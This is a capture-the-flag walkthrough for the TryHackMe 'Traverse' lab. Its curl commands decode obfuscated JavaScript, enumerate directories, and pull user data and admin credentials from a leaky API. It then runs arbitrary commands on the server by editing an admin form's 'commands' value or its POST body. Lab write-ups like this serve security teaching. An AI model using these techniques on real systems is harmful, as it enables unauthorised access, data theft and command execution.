# [Traverse](https://tryhackme.com/r/room/traverse)

**What type of encoding is used by the hackers to obfuscate the JavaScript file?**

```shell
export MACHINE_IP=x.x.x.x
curl http://$MACHINE_IP/custom.min.js
```

**What is the flag value after deobfuscating the file?**

Use [prettier.io](https://prettier.io/playground/) or similar to prettify javascript code

```shell
curl http://$MACHINE_IP/custom.min.js -s | tail -n +3 | xxd -r -p > custom.js
```

**What is the name of the file containing email dumps?**

Just guess or use [dirb](https://www.kali.org/tools/dirb/) or similar to check for common paths on the webserver:

```shell
dirb http://$MACHINE_IP
```

**What is the name of the directory that Bob has created?**
**What is the key file for opening the directory that Bob has created for Mark?**

```shell
curl http://$MACHINE_IP/logs/email_dump.txt
```

**What is the email address for ID 5 using the leaked API endpoint?**

```shell
curl http://$MACHINE_IP/api/?customer_id=5 -s | jq -r .data.email
```

**What is the ID for the user with admin privileges?**

```shell
curl http://$MACHINE_IP/api/?customer_id=3 -s | jq
```

**What is the endpoint for logging in as the admin?**

Get "loginURL":

```shell
curl http://$MACHINE_IP/api/?customer_id=3 -s | jq
```

**Can you find the name of the web shell that the attacker has uploaded?**
**What is the name of the file renamed by the attacker for managing the web server?**

From last answer get "loginURL" and "password", go to that URL and log in
* In the Admin Page you can execute two commands:
  * System Owner = `whoami`
  * Current Directory = `pwd`
* You can use Web Developer Tools to "Execute" `ls` to get the answers:
  * Alternative 1: use Inspector and change `<option value="whoami">System Owner</option>` to `<option value="ls">System Owner</option>` and then "Execute"
  * Alternative 2: use Network to capture a "Execute" call, copy as curl and then change `--data-raw 'commands=whoami'` to `--data-raw 'commands=ls'` and execute in a terminal
  * Alternative 3: once logged in, get the value for PHPSESSID cookie from Storage > Cookies and execute:
    ```shell
    curl 'http://$MACHINE_IP/realadmin/main.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=xxxxx' --data-raw 'commands=ls'
    ```

**Can you use the file manager to restore the original website by removing the "FINALLY HACKED" message? What is the flag value after restoring the main website?**

From last answer get the password for accessing original file manager and:
* Go to http://$MACHINE_IP/realadmin/renamed_file_manager.php and log in as admin
* Download `index.php`, you can see the flag already there
* Edit `index.php` and comment or remove line #12 `$message = "FINALLY HACKED"`, changing the value will work too
* Remove old `index.php` and upload new `index.php`
* Browse the main page to see `SUCCESSFULLY RESTORED WEBSITE FLAG: ...`
